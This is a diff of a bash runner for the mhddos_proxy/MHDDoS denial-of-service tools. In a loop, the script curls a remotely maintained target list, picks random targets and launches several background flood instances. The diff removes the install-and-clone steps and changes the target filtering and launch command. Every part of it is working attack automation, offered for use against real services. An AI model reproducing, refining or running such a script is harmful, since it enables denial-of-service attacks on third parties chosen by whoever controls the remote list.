@@ -30,65 +30,37 @@ proxy_interval="-p $proxy_interval"
 pkill -f start.py
 pkill python3
 
-# Install git, python3, pip if doesn't installed already
-apt update -y
-if [ ! -f /usr/bin/git ]; then
-   sudo apt install git -y
-fi
-if [ ! -f /usr/bin/python3 ]; then
-   sudo apt install python3 -y
-fi
-if [ ! -f /usr/bin/pip ]; then
-   apt install python3-pip  -y
-fi
-if [ ! -f /usr/bin/wget ]; then
-   apt install wget  -y
-fi
-if [ ! -f /usr/bin/curl ]; then
-   apt install curl  -y
-fi
-pip install --upgrade pip > /dev/null #No output. Resolved some problems with pip on debian
-
-#Install latest version of mhddos_proxy and MHDDoS
-cd ~
-rm -rf mhddos_proxy
-git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
-cd mhddos_proxy
-rm proxies_config.json
-wget https://raw.githubusercontent.com/Aruiem234/mhddosproxy/main/proxies_config.json
-git clone https://github.com/MHProDev/MHDDoS.git
-python3 -m pip install -r MHDDoS/requirements.txt
-
 # Restart attacks and update targets list every 15 minutes (by default)
 while true
 echo -e "#####################################\n"
 do
-   # Get number of targets in runner_targets. Only strings that starts with "runner.py" are used. Everything else is ommited.
-   list_size=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^runner.py" | wc -l)
-   
+   # Get number of targets in runner_targets. Only strings that are not commented out are used. Everything else is omitted.
+   list_size=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]" | wc -l)
+
    echo -e "\nNumber of targets in list: " $list_size "\n"
 
    # Create list with random numbers. To choose random targets from list on next step.
    random_numbers=$(shuf -i 1-$list_size -n $num_of_copies)
    echo -e "random number(s): " $random_numbers "\n"
-   
+
    # Print all randomly selected targets on screen
    echo -e "Choosen target(s):\n"
    for i in $random_numbers
    do
-             target=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^runner.py")")
+             target=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]")")
              echo -e "    "$target"\n"
    done
-      
+
    # Launch multiple mhddos_proxy instances with different targets.
    for i in $random_numbers
    do
             # Filter and only get lines that starts with "runner.py". Then get one target from that filtered list.
-            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^runner.py")")
-           
+            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]")")
+
             #echo $cmd_line
             echo $cmd_line $proxy_interval $threads $rpc
-            python3 ~/mhddos_proxy/$cmd_line $proxy_interval $threads $rpc&
+            cd ~/mhddos_proxy
+            python3 runner.py --debug $cmd_line $proxy_interval $threads $rpc&
    done
 echo -e "#####################################\n"
 sleep $restart_interval
